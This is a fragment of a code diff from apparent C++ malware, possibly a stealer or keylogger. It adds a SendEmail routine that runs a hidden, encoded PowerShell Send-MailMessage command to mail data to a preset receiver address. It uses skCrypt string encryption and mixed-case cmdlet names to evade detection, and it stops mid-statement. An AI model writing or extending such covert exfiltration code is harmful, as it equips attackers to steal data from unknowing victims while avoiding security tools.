@@ -4,14 +4,12 @@ using namespace std;
 using Json = nlohmann::json;
 namespace fs = std::experimental::filesystem;
 
-extern vector<string> filesLink;
-
 bool IsConnected2Internet() {
     return InternetCheckConnection(CA2W(skCrypt("http://www.google.com/")), FLAG_ICC_FORCE_CONNECTION, 0);
 }
 
 void SendEmail() {
-    system(PowershellEncodedCommand(
+    system(RunPSEncCommand(
         (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
         (string)skCrypt("' -tO '") + RECEIVERMAIL +
         (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
